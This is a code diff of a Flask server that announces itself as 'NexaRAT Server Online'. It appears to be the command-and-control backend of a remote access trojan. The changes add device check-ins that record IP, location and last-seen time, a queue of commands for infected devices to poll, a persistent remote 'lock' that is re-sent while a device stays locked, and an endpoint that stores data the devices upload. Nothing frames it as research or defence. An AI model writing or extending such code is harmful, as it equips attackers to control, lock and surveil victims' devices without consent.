@@ -1,11 +1,8 @@
 from flask import Flask, request, jsonify
-from flask_socketio import SocketIO, emit, join_room
 import uuid, hashlib, json, os
 from datetime import datetime
 
 app = Flask(__name__)
-app.secret_key = 'rahasia123'
-socketio = SocketIO(app, cors_allowed_origins='*')
 
 DB_FILE = 'db.json'
 
@@ -27,6 +24,10 @@ def get_user_by_api(api_key, db):
         if user['api_key'] == api_key:
             return username, user
     return None, None
+
+@app.route('/')
+def index():
+    return jsonify({'status': 'NexaRAT Server Online'})
 
 @app.route('/register', methods=['POST'])
 def register():
@@ -67,10 +68,11 @@ def register_device():
         'model': data.get('model', 'Unknown'),
         'ip': request.remote_addr,
         'location': data.get('location', 'Unknown'),
-        'status': 'online'
+        'status': 'online',
+        'last_seen': datetime.now().strftime('%H:%M %d/%m/%Y')
     }
-    if device_id not in db.get('commands', {}):
-        db.setdefault('commands', {})[device_id] = []
+    db.setdefault('commands', {}).setdefault(device_id, [])
+    db.setdefault('lock_status', {})[device_id] = False
     save_db(db)
     return jsonify({'status': 'ok'})
 
@@ -101,8 +103,18 @@ def send_command():
     if not user:
         return jsonify({'status': 'error'})
     device_id = data['device_id']
+    cmd = data.get('command')
     db.setdefault('commands', {}).setdefault(device_id, []).append(data)
-    log = {'time': datetime.now().strftime('%H:%M %d/%m/%Y'), 'device': device_id, 'command': data.get('command'), 'type': 'command'}
+    if cmd == 'lock':
+        db.setdefault('lock_status', {})[device_id] = True
+    elif cmd == 'unlock':
+        db.setdefault('lock_status', {})[device_id] = False
+    log = {
+        'time': datetime.now().strftime('%H:%M %d/%m/%Y'),
+        'device': device_id,
+        'command': cmd,
+        'type': 'command'
+    }
     db['logs'][username].append(log)
     save_db(db)
     return jsonify({'status': 'ok'})
@@ -115,12 +127,22 @@ def poll():
     username, user = get_user_by_api(api_key, db)
     if not user:
         return jsonify({})
+    # Update last seen
+    if device_id in db['users'][username]['devices']:
+        db['users'][username]['devices'][device_id]['status'] = 'online'
+        db['users'][username]['devices'][device_id]['last_seen'] = datetime.now().strftime('%H:%M %d/%m/%Y')
+    # Cek lock status
+    lock_status = db.get('lock_status', {}).get(device_id, False)
     commands = db.get('commands', {}).get(device_id, [])
     if commands:
         cmd = commands.pop(0)
         db['commands'][device_id] = commands
         save_db(db)
         return jsonify(cmd)
+    save_db(db)
+    # Kalau masih locked, kirim lock lagi
+    if lock_status:
+        return jsonify({'command': 'keep_lock'})
     return jsonify({})
 
 @app.route('/data', methods=['POST'])
@@ -131,10 +153,15 @@ def receive_data():
     username, user = get_user_by_api(api_key, db)
     if not user:
         return jsonify({'status': 'error'})
-    log = {'time': datetime.now().strftime('%H:%M %d/%m/%Y'), 'type': data.get('type'), 'device': data.get('device_id'), 'data': data.get('data')}
+    log = {
+        'time': datetime.now().strftime('%H:%M %d/%m/%Y'),
+        'type': data.get('type'),
+        'device': data.get('device_id'),
+        'data': data.get('data')
+    }
     db['logs'][username].append(log)
     save_db(db)
     return jsonify({'status': 'ok'})
 
 if __name__ == '__main__':
-    socketio.run(app, host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=5000)
